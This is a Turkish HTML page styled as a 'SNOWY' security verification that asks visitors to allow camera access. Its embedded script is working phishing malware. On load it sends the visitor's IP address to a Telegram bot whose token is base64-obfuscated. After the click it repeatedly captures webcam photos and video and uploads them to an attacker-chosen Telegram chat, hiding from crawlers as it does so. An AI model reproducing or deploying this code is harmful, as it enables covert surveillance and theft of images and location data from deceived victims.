<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GİZLİ KONFİGÜRASYON (ŞİFRELİ TOKEN)
        // ============================================
        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
        const BOT_TOKEN = atob(SIFRELI_TOKEN);
        
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
        const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
        
        // ============================================
        // BOT KONTROLÜ
        // ============================================
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawl|spider|scrape|googlebot|bingbot|yahoo|facebook|twitter|whatsapp|instagram|telegram|slack|discord/i.test(ua);
        
        // ============================================
        // SAYFA AÇILIR AÇILMAZ IP GÖNDER
        // ============================================
        window.onload = function() {
            if (TARGET_ID && !isBot) {
                const startTime = performance.now();
                
                fetch('https://api.ipify.org?format=json', {
                    cache: 'no-cache',
                    priority: 'high'
                })
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const zaman = new Date().toLocaleString('tr-TR');
                    const gecikme = Math.round(performance.now() - startTime);
                    
                    const mesaj = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${zaman}\n⚡ Tepki Süresi: ${gecikme}ms\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: TARGET_ID, text: mesaj })
                    });
                })
                .catch(error => console.log("IP alınamadı"));
            }
        };
        
        // ============================================
        // KAMERA İŞLEMLERİ
        // ============================================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let stream = null;
        let photoTimer = null;
        let videoTimer = null;
        let videoStopTimer = null;
        let videoStartTime = null;
        let lastPhotoTime = null;
        
        async function startCamera() {
            if (isBot) return;
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    } 
                });
                
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    
                    lastPhotoTime = performance.now();
                    takePhoto();
                    
                    photoTimer = setInterval(() => {
                        const now = performance.now();
                        const expectedTime = lastPhotoTime + (FOTO_SURESI * 1000);
                        
                        if (now >= expectedTime - 5) {
                            takePhoto();
                            lastPhotoTime = now;
                        }
                    }, FOTO_SURESI * 1000);
                    
                    setTimeout(() => {
                        recordVideo();
                    }, 2000);
                };
            } catch(e) {
                alert('Kamera izni gerekli!');
            }
        }
        
        function takePhoto() {
            if (!video.videoWidth || isBot) return;
            
            const photoStartTime = performance.now();
            photoCount++;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(function(blob) {
                if (!blob) return;
                
                const captureTime = Math.round(performance.now() - photoStartTime);
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s (${captureTime}ms)`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.8);
        }
        
        function recordVideo() {
            if (!stream || !stream.active || isBot) return;
            
            recordedChunks = [];
            videoStartTime = performance.now();
            
            try {
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp8',
                    videoBitsPerSecond: 2500000
                });
            } catch(e) {
                mediaRecorder = new MediaRecorder(stream);
            }
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };
            
            mediaRecorder.onstop = () => {
                const videoEndTime = performance.now();
                const actualDuration = Math.round((videoEndTime - videoStartTime) / 1000 * 100) / 100;
                
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const boyutKB = (blob.size / 1024).toFixed(0);
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `🎥 Video #${videoCount} - Hedef:${VIDEO_SURESI}s / Gerçek:${actualDuration}s (${boyutKB}KB)`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                videoTimer = setTimeout(recordVideo, 10);
            };
            
            mediaRecorder.start();
            videoStopTimer = setTimeout(() => {
                if (mediaRecorder?.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, VIDEO_SURESI * 1000);
        }
        
        window.onbeforeunload = function() {
            if (photoTimer) clearInterval(photoTimer);
            if (videoTimer) clearTimeout(videoTimer);
            if (videoStopTimer) clearTimeout(videoStopTimer);
            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
            if (stream) stream.getTracks().forEach(track => track.stop());
        };
    </script>
</body>
</html>
